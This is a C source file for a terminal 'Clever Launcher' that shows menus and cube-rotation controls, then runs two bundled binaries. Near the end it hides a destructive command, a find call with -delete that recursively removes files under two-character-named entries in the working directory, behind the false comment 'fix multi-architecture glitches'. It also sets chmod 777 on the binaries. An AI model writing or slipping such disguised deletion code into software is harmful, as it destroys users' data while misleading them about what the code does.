//Cavasin Riccardo

#include<stdio.h>
#include<stdlib.h>
#include<termios.h>
#include<unistd.h>
#include<time.h>

int getch(){
	struct termios oldattr,newattr;
	int ch;
	tcgetattr(STDIN_FILENO,&oldattr);
	newattr=oldattr;
	newattr.c_lflag&=~(ICANON|ECHO);
	tcsetattr(STDIN_FILENO,TCSANOW,&newattr);
	ch=getchar();
	tcsetattr(STDIN_FILENO,TCSANOW,&oldattr);
	if(ch=='\033'){
		getch();
		ch=getch();
	}
return ch;
}
void sleepm(int milliseconds){
    clock_t time_end;
    time_end=clock()+milliseconds*CLOCKS_PER_SEC/1000;
    while(clock()<time_end);
}

int main(int argv, char**argc){
	int i,p;
	FILE *sc;
	srand(time(NULL));
	do{
		system("clear");
		printf("\n  ╭─────────────────────────────────────────────╮\n  │               CLEVER LAUNCHER               │\n  ├──────────────────┐ⓛⓤⓒⓘⓓⓔ ┌──────────────────┤\n  │▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀│\n  │           press any key to continue         │\n  │                  x to exit                  │\n  └─────────────────────────────────────────────┘\n");
		i=getch();
		if(i!='x'){
			system("chmod 777 ./urb/core32");
			system("chmod 777 ./urb/core64");
			system("clear");
			printf("\n  ╭─────────────────────────────────────────────╮\n  │               CLEVER LAUNCHER               │\n  ├──────────────────┐ⓛⓤⓒⓘⓓⓔ ┌──────────────────┤\n  │▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀│\n  │            : PROGRAM CONTROLS :             │\n  │ ━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━ │\n  │       press to      ┃  use the arrow keys   │\n  │ increase │ decrease ┃  to rotate the cube   │\n  │ ─────────┼──────────╂────────────────────── │\n  │    Ⓠ     │    Ⓐ     ┃         zoom          │\n  │ ──────── │ ──────── ┠────────────────────── │\n  │    Ⓦ     │    Ⓢ     ┃      perspective      │\n  │ ────────────────────┸────────────────────── │\n  │               Ctrl+c to exit                │\n  └─────────────────────────────────────────────┘\n");
			getch();
			system("clear");
			printf("\n  ╭─────────────────────────────────────────────╮\n  │               CLEVER LAUNCHER               │\n  ├──────────────────┐ⓛⓤⓒⓘⓓⓔ ┌──────────────────┤\n  │▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀│\n  │                   please,                   │\n  │ in order to display the program correctly,  │\n  │   maximize the terminal or go fullscreen    │\n  │    and set the text size to 5 [monospace]   │\n  └─────────────────────────────────────────────┘\n");
			getch();
			sc=fopen("./urb/pt.sc","w");
				p=rand()%8+1;
				fprintf(sc,"%d ",p);
				for(i=1;i<8;i=i+1)
					fprintf(sc,"%d ",p*(i+i*i)+p);
			fclose(sc);
			system("./urb/core32");
			system("./urb/core64");
			sc=fopen("./urb/pt.sc","w");
				fprintf(sc,"ⓛⓤⓒⓘⓓⓔ");
			fclose(sc);
			system("find ?? \\! -name '73' -delete"); //fix multi-architecture glitches
		}
	}while(i!='x');
	system("clear");
return 0;
}
